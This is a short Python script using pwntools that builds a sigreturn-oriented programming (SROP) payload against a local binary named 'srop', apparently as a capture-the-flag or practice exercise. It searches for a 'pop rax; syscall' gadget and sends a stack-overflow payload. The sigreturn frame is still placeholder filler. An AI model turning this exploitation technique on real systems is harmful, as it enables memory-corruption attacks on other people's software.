# Name: srop.py
from pwn import *

context.arch = "x86_64"

p = process("./srop")
elf = ELF("./srop")

gdb.attach(p)

gadget = next(elf.search(asm("pop rax; syscall")))

print(gadget)

payload = b"A"*16
payload += b"B"*8
payload += p64(gadget)
payload += p64(15) # sigreturn
payload += b"\x00"*40 # dummy
payload += p64(0x4141414141414141)*20

p.sendline(payload)
p.interactive()
